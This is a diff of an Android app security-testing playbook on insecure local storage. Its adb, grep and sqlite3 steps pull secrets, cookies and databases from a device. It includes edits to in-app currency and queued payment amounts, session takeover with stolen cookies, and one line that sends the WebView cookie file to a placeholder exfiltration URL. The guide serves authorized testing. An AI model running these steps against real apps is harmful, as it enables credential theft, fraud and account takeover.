+| **Maps to** | MASTG-TEST-0304, MASTG-TEST-0306 (both **status: placeholder**), MASTG-KNOW-0037 (SQLite), MASWE-0001; CVE-2018-11242 (MakeMyTrip 7.2.4, EDB 44690) |
 
 - **Test:** Pull every `.db` and its `-wal`, `-shm` and `-journal` siblings. Two findings live here: the live
   table contents, and the residue in the WAL/journal that survives a row the app believes it deleted — which
@@ -922,14 +937,19 @@ strings app.db-wal | grep -iE 'token|@|bearer|[0-9]{12,19}'
   SQLCipher's take the passphrase. So *any string argument is the finding*, and a literal there — or a
   trivially reversible derivation (a constant plus `ANDROID_ID`, the package name, a build constant) — makes
   the encryption decorative. Do not stop at the first hit: each `*DBHelper`/`*OpenHelper` can carry a
-  different key.
+  different key. SQLCipher for Android >= 4.5 (`net.zetetic.database.sqlcipher`) no longer takes the passphrase in
+  `getWritableDatabase()`: the literal sits in `SupportOpenHelperFactory(byte[] passphrase)` or
+  `SQLiteDatabase.openOrCreateDatabase(path, password, ...)`, and its `getWritableDatabase()` has no argument — grep
+  both APIs or every current integration is missed.
 - **How:**
 ```bash
-grep -rn 'getWritableDatabase("' out/sources/
-grep -rn 'getReadableDatabase("' out/sources/
-grep -rn 'SQLiteDatabase\.loadLibs\|net\.sqlcipher\|SupportFactory\|SupportOpenHelperFactory' out/sources/
-grep -rnE 'class .*(DBHelper|OpenHelper|DatabaseHelper)' out/sources/
-grep -rn 'ANDROID_ID\|Settings\$Secure;->getString\|getPackageName()' out/sources/   # reversible derivations
+grep -rn 'getWritableDatabase("' $DEC/jadx/sources/
+grep -rn 'getReadableDatabase("' $DEC/jadx/sources/
+grep -rn 'SQLiteDatabase\.loadLibs\|net\.sqlcipher\|SupportFactory\|SupportOpenHelperFactory' $DEC/jadx/sources/
+grep -rnE 'net\.zetetic\.database|net\.sqlcipher|System\.loadLibrary\("sqlcipher"\)' $DEC/jadx/sources/ | head          # which SQLCipher package is in use
+grep -rnE 'SupportOpenHelperFactory\(\s*"[^"]+"|SupportOpenHelperFactory\(\s*[A-Za-z_.]+\.getBytes|SupportFactory\(\s*"|openOrCreateDatabase\([^)]*,\s*"[^"]+"' $DEC/jadx/sources/   # >= 4.5: the passphrase argument moved here
+grep -rnE 'class .*(DBHelper|OpenHelper|DatabaseHelper)' $DEC/jadx/sources/
+grep -rn 'ANDROID_ID\|Settings\$Secure;->getString\|getPackageName()' $DEC/jadx/sources/   # reversible derivations
 ```
   Prove impact by **decrypting the pulled DB**, never by asserting it:
 ```bash
@@ -996,16 +1016,20 @@ sqlite> SELECT * FROM users;
   and is decryptable from the moment the device boots, **before any unlock** — outside the lockscreen
   boundary the vendor relies on. Only Credential-Encrypted storage (`/data/user/<user>/<pkg>/`) is protected
   until the user authenticates. An app that caches a token, an API key or a phone number in DE storage to
-  work during Direct Boot has moved it out of that boundary.
+  work during Direct Boot has moved it out of that boundary. Harness trap: while the user is `RUNNING_LOCKED`, launching
+  any non-`directBootAware` activity fails with "Activity class does not exist" / "No activity found" — that is the
+  harness state, not a target refusal; check `dumpsys user` State and the credential type before any matrix run.
 - **How:**
 ```bash
-grep -rnE 'createDeviceProtectedStorageContext|isDeviceProtectedStorage|moveSharedPreferencesFrom|moveDatabaseFrom|directBootAware' out/sources/ out/AndroidManifest.xml
+grep -rnE 'createDeviceProtectedStorageContext|isDeviceProtectedStorage|moveSharedPreferencesFrom|moveDatabaseFrom|directBootAware' $DEC/jadx/sources/ $DEC/apktool/AndroidManifest.xml
 adb shell run-as $PKG ls -la /data/user_de/0/$PKG/       # DE
 adb shell run-as $PKG ls -la /data/user/0/$PKG/          # CE
-# the demonstration: reboot, and read BEFORE entering the PIN (rooted test device)
+# the demonstration: reboot and read BEFORE the credential is entered (rooted test device WITH a lock credential set)
+adb shell locksettings set-pin 1234            # a device with no credential never has a locked CE state — nothing to demonstrate
 adb reboot && adb wait-for-device
-adb shell 'ls -la /data/user_de/0/'"$PKG"'; cat /data/user_de/0/'"$PKG"'/shared_prefs/*.xml'
-adb shell dumpsys user | grep -i unlocked
+adb shell dumpsys user | grep -E 'State:|UserInfo'   # must read RUNNING_LOCKED — RUNNING_UNLOCKED means you are too late
+adb shell su -c 'ls -la /data/user_de/0/'"$PKG"'; cat /data/user_de/0/'"$PKG"'/shared_prefs/*.xml'   # su: a plain adb shell cannot read it
+adb shell su -c 'ls /data/user/0/'"$PKG"' 2>&1'       # control: CE must be unreadable in the same shell
 ```
 - **Proof:** A secret (token, PIN hash, key) present under `/data/user_de/0/<pkg>/` and read from a shell
   taken **before the PIN was entered** — include the `dumpsys user` unlocked=false line or the lock screen
@@ -1022,7 +1046,7 @@ adb shell dumpsys user | grep -i unlocked
 | | |
 |---|---|
 | **Severity ceiling** | Medium–High; High when the cache survives logout and the device is shared/lost |
-| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5); `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (VARIES) |
+| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5); `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (varies) |
 | **Attacker** | AM-03 with a reach primitive; AM-05 for cross-account bleed |
 | **Applies to** | all; acute on apps with KYC/document scan, chat media, or an HTTP cache |
 | **Requires** | device |
@@ -1058,16 +1082,20 @@ adb shell run-as $PKG ls -laR cache/image_manager_disk_cache 2>/dev/null    # Gl
 | **Requires** | device |
 | **Maps to** | ivrodriguez "Tips for Mobile Bug Bounty Hunting" (search the bundle for non-image files); H1 #351555 (Cloudinary api secret in Android app), H1 #753868 |
 
-- **Test:** This is storage the attacker reads *from the APK*, with no device at all — the closest this
+- **Test:** The sweep itself is run once in D02-047/D18-004; this item consumes only the storage-relevant subset — a
+  key that decrypts a local store (D11-016/D11-023), an HMAC key over a stored blob, a DB passphrase — and proves it
+  against the pulled file. This is storage the attacker reads *from the APK*, with no device at all — the closest this
   chapter comes to a P1 on its own. Developers leave test config, private keys and API secrets in `assets/`,
   `res/raw/` and the `strings.xml` derived from `google-services.json`.
 - **How:**
 ```bash
-find out/assets out/res/raw -type f | grep -viE '\.(png|jpg|jpeg|webp|gif|ttf|otf|xml|json)$'
-grep -rInE '(BEGIN (RSA|EC|OPENSSH) PRIVATE KEY|aws_access_key_id|"private_key"|client_secret|apikey)' out/assets out/res
-grep -iE 'google_api_key|google_app_id|firebase|gcm_defaultSenderId' out/res/values/strings.xml
-strings -a out/lib/*/*.so classes*.dex | grep -E '^[[:alnum:]]{64}$'      # 64-char keys
-strings -a out/lib/*/*.so classes*.dex | grep -E '^[-[:alnum:]]{36}$'     # UUIDs used as keys/salts
+find $DEC/apktool/assets $DEC/apktool/res/raw -type f | grep -viE '\.(png|jpg|jpeg|webp|gif|ttf|otf|xml|json)$'
+grep -rInE '(BEGIN (RSA|EC|OPENSSH) PRIVATE KEY|aws_access_key_id|"private_key"|client_secret|apikey)' $DEC/apktool/assets $DEC/apktool/res
+grep -iE 'google_api_key|google_app_id|firebase|gcm_defaultSenderId' $DEC/apktool/res/values/strings.xml
+grep -iE 'staging|internal|test\.|\.dev|debug_url|backend' $DEC/apktool/res/values/strings.xml      # internal endpoint lists (was D11-068)
+mkdir -p $DEC/dex && unzip -o "$APK" 'classes*.dex' -d $DEC/dex >/dev/null                 # extract the DEX once
+strings -a $DEC/apktool/lib/*/*.so $DEC/dex/classes*.dex | grep -E '^[[:alnum:]]{64}$'      # 64-char keys
+strings -a $DEC/apktool/lib/*/*.so $DEC/dex/classes*.dex | grep -E '^[-[:alnum:]]{36}$'     # UUIDs used as keys/salts
 ```
   Then confirm the constant reaches a live sink: a `SecretKeySpec(<const>.getBytes(), "AES")`, an HMAC key,
   or an authenticating API call.
@@ -1097,12 +1125,13 @@ strings -a out/lib/*/*.so classes*.dex | grep -E '^[-[:alnum:]]{36}$'     # UUID
   credentials in plaintext, and the app team never audited them.
 - **How:**
 ```bash
-# exercise the SDK flows, then:
-adb shell run-as $PKG find . -type f -newermt '-10 minutes' 2>/dev/null
-for f in $(adb shell run-as $PKG ls shared_prefs/); do
-  echo "== $f"; adb shell run-as $PKG cat shared_prefs/"$f"
-done | grep -iE 'token|secret|jwt|refresh|access|password|apikey|"ey[A-Za-z0-9_-]{10,}'
-adb shell run-as $PKG ls -la databases/ files/ no_backup/
+adb shell touch /data/local/tmp/d11-mark                       # BEFORE exercising the SDK flows — toybox find has no -newermt '-10 minutes'
+# ... social login, open chat, trigger a push ...
+adb shell run-as "$PKG" find . -type f -newer /data/local/tmp/d11-mark | tee logs/D11-028.txt | wc -l
+adb exec-out run-as "$PKG" tar -cf - shared_prefs databases files no_backup > sdk.tar && mkdir -p pulled && tar -xf sdk.tar -C pulled   # one-shot pull; never `for f in $(adb shell ...)` (D11-010)
+echo "files pulled: $(find pulled -type f | wc -l)"                                                              # the denominator
+grep -rIl --binary-files=text -iE 'token|secret|jwt|refresh|access|password|apikey|ey[A-Za-z0-9_-]{10,}' pulled/shared_prefs/
+adb shell run-as "$PKG" ls -la databases/ files/ no_backup/
 ```
 - **Proof:** The SDK file path plus the plaintext token, and a follow-up authenticated API call with that
   token from curl returning the victim's data — that second half converts Low to High.
@@ -1122,6 +1151,7 @@ adb shell run-as $PKG ls -la databases/ files/ no_backup/
 | **Applies to** | React Native apps with CodePush or expo-updates |
 | **Requires** | react-native, hermes |
 | **Maps to** | `CodePushConstants.java` (`CODE_PUSH_FOLDER_PREFIX = "CodePush"`, `STATUS_FILE = "codepush.json"`, `DEFAULT_JS_BUNDLE_NAME = "index.android.bundle"`, `BUNDLE_JWT_FILE = ".codepushrelease"`) |
+| **Record** | `logs/D11-029.txt`; D01-032 decides which bundle runs; this item owns the cache as a write target — `covered-by D01-032` for the identification half |
 
 - **Test:** OTA frameworks cache downloaded JS and assets on disk. That cache is (a) a second copy of the
   code you must analyse — the running bundle, not the one in the APK — and (b) the write target for the OTA
@@ -1140,7 +1170,7 @@ adb shell run-as $PKG ls -laR files/.expo-internal/ 2>/dev/null
   runs**.
 - **Escalation:** -> D17 (OTA substitution / supply chain), -> D19 (the bundle is the RN attack surface),
   -> D14 if the update channel is unpinned.
-- **Ruled out when:** No OTA framework is present (`grep -rn 'CodePush\|expo-updates' out/`), or the bundle
+- **Ruled out when:** No OTA framework is present (`grep -rn 'CodePush\|expo-updates' $DEC/jadx/sources/`), or the bundle
   in the cache matches the APK's `sourceHash` and the `.codepushrelease` JWT is verified against a key not
   in the APK.
 
@@ -1161,8 +1191,16 @@ adb shell run-as $PKG ls -laR files/.expo-internal/ 2>/dev/null
 - **How:**
 ```bash
 adb shell run-as $PKG cat "shared_prefs/${PKG}.v2.playerprefs.xml"
-grep -nE 'PlayerPrefs\.(Set|Get)(Int|Float|String)|persistentDataPath' out/dump.cs | head -40
-adb shell run-as $PKG sh -c "sed -i 's/\"coins\">100</\"coins\">999999</' shared_prefs/${PKG}.v2.playerprefs.xml"
+grep -nE 'PlayerPrefs\.(Set|Get)(Int|Float|String)|persistentDataPath' $DEC/il2cpp/dump.cs | head -40
+# ints/floats are SharedPreferences ATTRIBUTES (`<int name="coins" value="100" />`), not element text (D11-007) — edit on the host, push back
+adb exec-out run-as "$PKG" cat "shared_prefs/${PKG}.v2.playerprefs.xml" > pp.xml
+python3 - <<'PY'
+import re; p='pp.xml'; s=open(p).read()
+s=re.sub(r'(<int name="coins" value=")\d+(")', r'\g<1>999999\2', s)      # strings are <string name="k">v</string> (URL-encoded)
+open(p,'w').write(s)
+PY
+adb push pp.xml /data/local/tmp/ && adb shell run-as "$PKG" cp /data/local/tmp/pp.xml "shared_prefs/${PKG}.v2.playerprefs.xml"
+adb shell am force-stop "$PKG" && adb shell monkey -p "$PKG" 1
 adb shell am force-stop $PKG && adb shell monkey -p $PKG 1
 ```
 - **Proof:** The modified value reflected in the UI after relaunch **and** accepted by the server — a
@@ -1194,11 +1232,21 @@ sqlite3 Cookies.db 'select host_key,name,is_httponly,substr(value,1,20) from coo
 adb shell run-as $PKG ls -laR app_webview/Default/Local\ Storage app_webview/Default/IndexedDB
 # LEGACY saved form credentials:
 adb shell run-as $PKG cat databases/webview.db 2>/dev/null
+# where do the cookies come from? (web-login bootstrap / cookie minting vs a user login inside the WebView)
+grep -rnE 'CookieManager\.getInstance\(\)\.setCookie\(|setAcceptThirdPartyCookies|weblogin:|MergeSession|uberauth|\.setCookie\(' $DEC/jadx/sources/ | head -30
+# impact split: JS-readable (a D10 XSS chain reaches them) vs httpOnly (the file read only)
+sqlite3 Cookies.db "select host_key,name,is_httponly,is_secure,expires_utc from cookies order by is_httponly;"
+sqlite3 Cookies.db "select sum(is_httponly=0) as js_readable, sum(is_httponly=1) as httponly from cookies;"
+# multi-profile WebView (API 33+ Profile API): every profile keeps its own jar; pull the journal with the DB
+adb shell run-as "$PKG" ls -la app_webview/
+adb exec-out run-as "$PKG" cat app_webview/Default/Cookies-journal > Cookies-journal 2>/dev/null
 ```
   Remote path when a bridge exposes a file read:
   `nativeBridge.uploadFile('/data/user/0/'+PKG+'/app_webview/Default/Cookies', exfilUrl)`.
 - **Proof:** The cookie rows loaded into a fresh browser profile, landing in the victim's authenticated web
-  session — screenshot the logged-in page reached with cookies from the device.
+  session — screenshot the logged-in page reached with cookies from the device. Name the minting path (a bootstrap
+  URL exchanged for session cookies vs a user login inside the WebView) and report the two counts: `is_httponly=0`
+  cookies are reachable by a D10 XSS, `is_httponly=1` only by the file read — that split decides the chained severity.
 - **Escalation:** -> D13/D15 cross-surface ATO; -> D10 when a bridge or `file://` WebView makes the read
   remote (H1 #44727 stored cleartext creds in `databases/webview.db`).
 - **Ruled out when:** The WebView carries no authenticated session (public content only), or the cookie
@@ -1216,16 +1264,22 @@ adb shell run-as $PKG cat databases/webview.db 2>/dev/null
 | **Requires** | device, firebase |
 | **Maps to** | MASTG-KNOW-0039 (Firebase Real-time Databases), MASTG-TECH-0008 |
 
-- **Test:** Beyond the four standard directories, enumerate library-specific stores. A Firebase config here
-  (the RTDB URL and project id) is the pivot into a D18 open-database test; the offline cache
-  (`files/*.firebase*`, Firestore's local persistence) also holds authenticated documents.
+- **Test:** Beyond the four standard directories, enumerate library-specific stores. `firebase_database_url` /
+  `google_storage_bucket` in `strings.xml` are written by the build plugin whenever the project enables the product,
+  even with no RTDB/Storage SDK in the APK — confirm a registered consumer (the component registrar below) before
+  carrying the URL to D18, and say in the row whether the probed store has any consumer at all. The offline cache
+  (Firestore/RTDB persistence under `databases/`) also holds authenticated documents.
 - **How:**
 ```bash
-objection -n "$PKG" start
-# then: env   (prints cacheDirectory, filesDirectory, obbDir, packageCodePath)
+objection -S "$SERIAL" -g "$PKG" explore
+# then inside the REPL: env   (prints cacheDirectory, filesDirectory, obbDir, packageCodePath); objection breaks on major frida releases — pin a known-good frida/objection pair in `scripts/doctor.sh` output
 adb shell run-as $PKG find . -type f | sort
 adb shell run-as $PKG ls -la no_backup app_webview files
-grep -iE 'firebase_database_url|firebase_url|project_id|storage_bucket' out/res/values/strings.xml
+grep -iE 'firebase_database_url|firebase_url|project_id|storage_bucket' $DEC/apktool/res/values/strings.xml
+# which Firebase components are actually registered? (database, firestore, storage, auth ...) — a URL with no registrar has no consumer in this app
+grep -nE 'com.google.firebase.components.ComponentDiscoveryService' -A25 $DEC/apktool/AndroidManifest.xml | grep -oE 'com\.google\.firebase\.[a-z]+' | sort -u
+# offline persistence lives in databases/, not files/: Firestore 'firestore.*' SQLite, RTDB a per-repo SQLite
+adb shell run-as "$PKG" ls -la databases/ | grep -iE 'firestore|firebase|_default'
 ```
 - **Proof:** Files outside the expected directories holding markers (a `.realm`, a Firebase cache, a key
   file), or a Firestore/RTDB URL that you then test unauthenticated in D18.
@@ -1238,7 +1292,7 @@ grep -iE 'firebase_database_url|firebase_url|project_id|storage_bucket' out/res/
 | | |
 |---|---|
 | **Severity ceiling** | Medium; High when the residue is a live credential or crosses accounts on a shared device |
-| **VRT** | `insecure_data_storage...on_internal_storage` (P5); `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (VARIES); escalates via `broken_authentication_and_session_management.authentication_bypass` (P1) |
+| **VRT** | `insecure_data_storage...on_internal_storage` (P5); `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (varies); escalates via `broken_authentication_and_session_management.authentication_bypass` (P1) |
 | **Attacker** | AM-05 another user of the same app; AM-11 device handed on/borrowed |
 | **Applies to** | all; weight up for apps with an in-app account switcher or a kiosk/shared-device mode |
 | **Requires** | device, two-accounts |
@@ -1258,7 +1312,8 @@ adb shell run-as $PKG find "$P" -type f -exec md5sum {} \; | sort > after.txt
 diff before.txt after.txt
 adb exec-out run-as $PKG sh -c 'grep -rl "<A-token>" . 2>/dev/null'
 # then log in as account B and re-run the grep for A's identifiers
-adb shell run-as $PKG sqlite3 app_webview/Default/Cookies 'select host_key,name from cookies;'
+for s in '' -journal; do adb exec-out run-as "$PKG" cat "app_webview/Default/Cookies$s" > "Cookies$s" 2>/dev/null; done   # pull, then query on the HOST: the sqlite3 binary exists only on AVD/userdebug images
+sqlite3 Cookies 'select host_key,name from cookies;'
 ```
 - **Proof:** The post-logout grep still finding account A's session token, **plus** a successful
   authenticated API call with that token (proving it is not server-revoked either); or A's email/phone/PII
@@ -1286,8 +1341,10 @@ adb shell run-as $PKG sqlite3 app_webview/Default/Cookies 'select host_key,name 
 - **How:**
 ```bash
 adb shell dumpsys account | grep -A8 "$PKG"
-grep -rn 'deleteEntry(\|KeyStore\.getInstance("AndroidKeyStore")\|AccountManager' out/sources/
+grep -rn 'deleteEntry(\|KeyStore\.getInstance("AndroidKeyStore")\|AccountManager' $DEC/jadx/sources/
+grep -oE 'android:hasFragileUserData="[^"]*"' $DEC/apktool/AndroidManifest.xml   # API 29: uninstall offers 'Keep app data'
 adb uninstall $PKG && adb install app.apk
+adb shell pm uninstall -k --user 0 "$PKG" && adb install-multiple -t --user 0 base.apk split_*.apk   # emulate the keep-data path, then observe the session
 # then launch and observe whether it resumes an authenticated session with no re-auth
 ```
 - **Proof:** After reinstall the app opens an authenticated session without re-authentication — a screen
@@ -1295,14 +1352,16 @@ adb uninstall $PKG && adb install app.apk
 - **Escalation:** -> D13 (session/credential lifecycle), -> D11-051 (the cloud-backup restore is the vehicle).
 - **Ruled out when:** Reinstall lands on the login screen, `AccountManager` holds no account for the package
   after uninstall, and Keystore aliases were deleted on logout (or are not shared across a `sharedUserId`).
-  Note keystore aliases persist across reinstall only if the app reuses a shared uid or never deleted the key.
+  A full uninstall clears the package's Keystore namespace (keys survive only a keep-data uninstall or a `sharedUserId`
+  sibling); a resumed session after a clean reinstall therefore comes from cloud/D2D restore, `AccountManager`, or
+  `hasFragileUserData` — name which.
 
 ### D11-035 · Search history, recent queries and autocomplete cache holding PII
 
 | | |
 |---|---|
 | **Severity ceiling** | Medium; High if a `SearchRecentSuggestionsProvider` is exported |
-| **VRT** | `insecure_data_storage...on_internal_storage` (P5); `broken_access_control.exposed_sensitive_android_intent` (VARIES) if the provider is exported |
+| **VRT** | `insecure_data_storage...on_internal_storage` (P5); `broken_access_control.exposed_sensitive_android_intent` (varies) if the provider is exported |
 | **Attacker** | AM-05 cross-account on a shared device; AM-03 if the provider is exported |
 | **Applies to** | any app with a search box that remembers queries |
 | **Requires** | device |
@@ -1314,8 +1373,8 @@ adb uninstall $PKG && adb install app.apk
   same device, and whether the suggestions provider is exported.
 - **How:**
 ```bash
-grep -rnE 'SearchRecentSuggestions|SearchRecentSuggestionsProvider|recent_search|searchHistory|saveRecentQuery' out/sources/
-grep -n 'android.content.SearchRecentSuggestionsProvider' out/AndroidManifest.xml
+grep -rnE 'SearchRecentSuggestions|SearchRecentSuggestionsProvider|recent_search|searchHistory|saveRecentQuery' $DEC/jadx/sources/
+grep -n 'android.content.SearchRecentSuggestionsProvider' $DEC/apktool/AndroidManifest.xml
 adb shell run-as $PKG find . -iname '*search*' -o -iname '*recent*'
 adb shell content query --uri content://$PKG.SuggestionProvider/search_suggest_query/a
 ```
@@ -1343,12 +1402,16 @@ adb shell content query --uri content://$PKG.SuggestionProvider/search_suggest_q
   it syncs.
 - **How:**
 ```bash
-grep -rnE 'outbox|pending(Operation|Mutation|Request)|offlineQueue|syncQueue|enqueueUniqueWork|OneTimeWorkRequest|setInputData|Data\.Builder' out/sources/
+grep -rnE 'outbox|pending(Operation|Mutation|Request)|offlineQueue|syncQueue|enqueueUniqueWork|OneTimeWorkRequest|setInputData|Data\.Builder' $DEC/jadx/sources/
 adb shell svc wifi disable; adb shell svc data disable
 # ... perform "transfer 1.00 to me" / "mark order delivered" in the app ...
-adb shell run-as $PKG sqlite3 databases/app.db 'select * from pending_ops;'
-adb shell run-as $PKG sqlite3 databases/androidx.work.workdb 'select id,worker_class_name,input from WorkSpec;'
-adb shell run-as $PKG sqlite3 databases/app.db "update pending_ops set payload=replace(payload,'1.00','5000.00')"
+# pull -> host sqlite3 -> push back: the sqlite3 binary exists only on AVD/userdebug images, so an on-device `run-as $PKG sqlite3` reads as empty on a stock device
+for s in '' -wal -shm; do adb exec-out run-as "$PKG" cat "databases/app.db$s" > "app.db$s" 2>/dev/null; done   # pull the WAL/SHM siblings so sqlite3 replays the WAL
+for s in '' -wal -shm; do adb exec-out run-as "$PKG" cat "databases/androidx.work.workdb$s" > "work.db$s" 2>/dev/null; done
+sqlite3 app.db 'select * from pending_ops;'
+sqlite3 work.db 'select id,worker_class_name,input from WorkSpec;'
+sqlite3 app.db "update pending_ops set payload=replace(payload,'1.00','5000.00')"
+adb push app.db /data/local/tmp/app.db && adb shell run-as "$PKG" sh -c 'cp /data/local/tmp/app.db databases/app.db && rm -f databases/app.db-wal databases/app.db-shm'   # drop the stale WAL or the edit is overridden
 adb shell svc wifi enable
 ```
 - **Proof:** The replayed request in Burp carrying the edited value and the server returning 200 with the new
@@ -1364,7 +1427,7 @@ adb shell svc wifi enable
 | | |
 |---|---|
 | **Severity ceiling** | Medium; High if the cache lands in shared storage |
-| **VRT** | `insecure_data_storage...on_internal_storage` (P5) / `...on_external_storage` (P4); `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (VARIES) |
+| **VRT** | `insecure_data_storage...on_internal_storage` (P5) / `...on_external_storage` (P4); `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (varies) |
 | **Attacker** | AM-05 (next user); AM-03 (shared storage) |
 | **Applies to** | apps with chat, support chat or user-to-user media |
 | **Requires** | device, two-accounts |
@@ -1376,8 +1439,10 @@ adb shell svc wifi enable
 - **How:**
 ```bash
 # as user A: send/receive an image and a message, then delete-for-everyone from the sender
-adb shell run-as $PKG find . -newermt '-10 minutes' -type f | sort
-adb shell run-as $PKG sqlite3 databases/chat.db 'select _id,body,deleted,attachment_path from messages;'
+adb shell touch /data/local/tmp/d11-mark                                  # set BEFORE the send/delete — toybox find has no -newermt
+adb shell run-as "$PKG" find . -type f -newer /data/local/tmp/d11-mark | sort
+for s in '' -wal -shm; do adb exec-out run-as "$PKG" cat "databases/chat.db$s" > "chat.db$s" 2>/dev/null; done   # pull the WAL siblings; sqlite3 is absent on stock devices
+sqlite3 chat.db 'select _id,body,deleted,attachment_path from messages;'
 # then log out, log in as user B, repeat the find
 ```
 - **Proof:** The deleted message body still present in `messages` (or its attachment still on disk) after the
@@ -1403,12 +1468,15 @@ adb shell run-as $PKG sqlite3 databases/chat.db 'select _id,body,deleted,attachm
   node tree leaks to any accessibility consumer.
 - **How:**
 ```bash
-grep -rnE 'setVisibility\((View\.)?(GONE|INVISIBLE)\)' out/sources/ -B6 | grep -inE 'token|password|pan|card|otp|ssn'
+grep -rnE 'setVisibility\((View\.)?(GONE|INVISIBLE)\)' $DEC/jadx/sources/ -B6 | grep -inE 'token|password|pan|card|otp|ssn'
 adb shell uiautomator dump /sdcard/ui.xml && adb pull /sdcard/ui.xml
+# dump killed (Compose-heavy UI) or failed at UiAutomation.connect (another UiAutomation client is bound)? the empty file is NOT a negative
+[ -s ui.xml ] || echo 'DUMP FAILED — use the probe accessibility service (the attacker-model-correct reader): log every AccessibilityNodeInfo text/contentDescription on the screen'
 grep -io 'text="[^"]*"' ui.xml | head -40
 ```
 - **Proof:** `uiautomator dump` (or an accessibility-service dump) containing the value while it is invisible
-  on screen.
+  on screen. When `uiautomator dump` cannot run, the proof is the PoC accessibility service's own log of the node
+  tree (which is also the AM-04 demonstration); record the dump failure mode, never a negative from an empty XML.
 - **Escalation:** -> D20/D21 (accessibility abuse); a banking trojan reads the node tree without any storage
   access at all.
 - **Ruled out when:** Hidden sensitive fields are cleared (`setText("")`) rather than hidden, or the value
@@ -1424,6 +1492,7 @@ grep -io 'text="[^"]*"' ui.xml | head -40
 | **Applies to** | all; Android 15 adds automatic screenshare protection for sensitive fields, narrowing it |
 | **Requires** | device |
 | **Maps to** | MobSF `android_prevent_screenshot`; mindedsecurity `MSTG-STORAGE-9` (`$P1 & 8192 == 0`); MASWE-0038; VRT `insecure_data_storage.screen_caching_enabled` (P5) |
+| **Record** | `logs/D11-039.txt`; owned by D04-042..D04-044 (the snapshot store) and D20-040 (privacy framing); D11 contributes only the on-disk snapshot path — record `covered-by` when those ran first |
 
 - **Test:** Without `FLAG_SECURE`, the OS writes a task-snapshot to disk when the app backgrounds, and the
   screen is capturable by screen-recording/casting. This is P5 and will close on its own — report only when
@@ -1431,7 +1500,7 @@ grep -io 'text="[^"]*"' ui.xml | head -40
   the device or the snapshot store.
 - **How:**
 ```bash
-grep -rnE 'FLAG_SECURE|setFlags\(WindowManager|addFlags\(' out/sources/    # $P1 & 8192 == 0 means absent
+grep -rnE 'FLAG_SECURE|setFlags\(WindowManager|addFlags\(' $DEC/jadx/sources/    # $P1 & 8192 == 0 means absent
 # reproduce: open the sensitive screen, press Home, open Recents, screenshot
 adb shell run-as $PKG ls -l /data/system_ce/0/snapshots/ 2>/dev/null       # rooted
 ```
@@ -1464,7 +1533,7 @@ adb exec-out run-as $PKG cat databases/app.db-wal > app.db-wal 2>/dev/null
 sqlite3 app.db "PRAGMA freelist_count; VACUUM;" # note if VACUUM is what actually clears it
 strings app.db app.db-wal | grep -iE 'token|@|[0-9]{12,19}|<deleted-value>'
 # external download residue
-adb shell find /sdcard/Download -newermt '-1 day' -type f 2>/dev/null
+adb shell find /sdcard/Download -type f -newer /data/local/tmp/d11-mark 2>/dev/null   # `adb shell touch /data/local/tmp/d11-mark` before the download flow; toybox find has no -newermt
 ```
 - **Proof:** `strings` recovering a value the app claims to have deleted, from the DB body, the WAL, or the
   freelist — quote the value and the flow that "deleted" it.
@@ -1491,13 +1560,17 @@ adb shell find /sdcard/Download -newermt '-1 day' -type f 2>/dev/null
 - **How:**
 ```bash
 # static
-grep -rnE 'getExternalStorageDirectory|getExternalStoragePublicDirectory|getExternalFilesDir|getExternalCacheDir|MediaStore|Environment\.DIRECTORY_' out/sources/
-grep -nE 'WRITE_EXTERNAL_STORAGE|MANAGE_EXTERNAL_STORAGE|READ_EXTERNAL_STORAGE|READ_MEDIA_' out/AndroidManifest.xml
+grep -rnE 'getExternalStorageDirectory|getExternalStoragePublicDirectory|getExternalFilesDir|getExternalCacheDir|MediaStore|Environment\.DIRECTORY_' $DEC/jadx/sources/
+grep -nE 'WRITE_EXTERNAL_STORAGE|MANAGE_EXTERNAL_STORAGE|READ_EXTERNAL_STORAGE|READ_MEDIA_' $DEC/apktool/AndroidManifest.xml
 # dynamic diff — no root
 adb shell 'find /sdcard /storage/emulated/0 -type f' | sort > sd_before.txt
 # ... exercise the app ...
 adb shell 'find /sdcard /storage/emulated/0 -type f' | sort > sd_after.txt
 comm -13 sd_before.txt sd_after.txt
+# the app's OWN writes into PUBLIC collections (receipts, screenshots, exported QR/PDF) — readable by any READ_MEDIA_* holder
+grep -rnE 'MediaStore\.(Images|Video|Audio|Downloads|Files)\.[A-Za-z]+\.EXTERNAL_CONTENT_URI|insertImage\(|Environment\.DIRECTORY_(PICTURES|DCIM|DOWNLOADS|DOCUMENTS)' $DEC/jadx/sources/
+# share-sheet trap: a 'share receipt' that inserts into MediaStore.Images BEFORE the chooser leaves the image behind whether or not the user shares
+adb shell content query --uri content://media/external/images/media --projection _display_name:relative_path:owner_package_name --where "owner_package_name='$PKG'"
 ```
 ```javascript
 // catch every Java write path + the MediaStore insert at once
@@ -1516,10 +1589,14 @@ Java.perform(function () {
   under that package's own logcat tag. State exactly which permission (if any) the reader needed.
 - **Escalation:** -> D20; -> D17 if the app reads code/config back from there (Man-in-the-Disk, D11-046);
   `MANAGE_EXTERNAL_STORAGE` in the manifest is itself an over-broad-permission flag under D03.
-- **Ruled out when:** All writes land under `Android/data/<pkg>` on a targetSdk 30+ device and a second app
-  is denied the read (`Permission denied` from the PoC app on Android 11+), and nothing sensitive reaches
-  `Download/`, `DCIM/` or a public MediaStore collection. State `ro.build.version.sdk` — the cross-app read
-  is dead for `Android/data` on 11+ but `Download`/`DCIM`/MediaStore stay broadly readable.
+- **Ruled out when:** All writes land under `Android/data/<pkg>` (NOT `Android/media/<pkg>`, which is indexed by
+  MediaStore and readable by media-permission holders on every version) on a targetSdk 30+ device, a second app is
+  denied the read (`Permission denied` from the PoC app on Android 11+), and nothing lands in a public collection
+  (the `content query` above returns no row owned by the package). State `ro.build.version.sdk` and the reader's
+  permission: on 13+ the reader needs `READ_MEDIA_IMAGES/VIDEO/AUDIO` (AM-04); on 14+ the user may grant only
+  selected photos (`READ_MEDIA_VISUAL_USER_SELECTED`), so the PoC must show the full-grant case. Non-media files
+  another app wrote to `Download/` are NOT readable on 11+ without All-Files access or SAF — do not write
+  "`Download` stays broadly readable".
 
 ### D11-042 · Scoped-storage bypass and `MANAGE_EXTERNAL_STORAGE` over-request
 
